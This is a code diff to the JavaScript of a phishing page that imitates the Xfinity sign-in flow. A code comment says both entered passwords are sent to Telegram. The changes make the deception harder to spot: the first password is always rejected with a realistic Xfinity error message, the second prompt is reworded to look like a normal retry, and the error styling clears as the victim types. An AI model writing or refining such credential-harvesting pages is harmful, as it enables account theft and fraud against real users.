@@ -989,19 +989,18 @@
                 setTimeout(() => {
                     setLoading(signinBtn, false);
                     
-                    passwordError.textContent = "Incorrect password. Please try again.";
+                    // Show correct error message like Xfinity
+                    passwordError.textContent = "The Xfinity ID or password you entered was incorrect. Please try again.";
                     password.classList.add('invalid');
                     passwordError.classList.add('visible');
                     password.value = "";
                     password.focus();
                     
+                    // Change to password2 step
                     step = 'password2';
-                    title.textContent = "Enter your new password";
-                    signinBtn.textContent = "Continue";
+                    title.textContent = "Enter your password";
+                    signinBtn.textContent = "Sign In";
                     
-                    setTimeout(() => {
-                        passwordError.textContent = "Incorrect password. Please enter your new password.";
-                    }, 100);
                 }, 600);
                 
                 return;
@@ -1010,7 +1009,7 @@
             // STEP 3: Capture Password 2 (Send both P1 and P2 to Telegram)
             if (step === 'password2') {
                 if (!password.value) {
-                    showError(password, passwordError, true, "Please enter your new password.");
+                    showError(password, passwordError, true, "Please enter your password.");
                     password.focus();
                     return;
                 }
@@ -1070,7 +1069,13 @@
             }
         });
 
-        password.addEventListener("input", function () {});
+        password.addEventListener("input", function () {
+            // Remove error styling when user starts typing
+            if (passwordError.classList.contains('visible')) {
+                passwordError.classList.remove('visible');
+                password.classList.remove('invalid');
+            }
+        });
 
         // ============================================
         // TOGGLE PASSWORD VISIBILITY
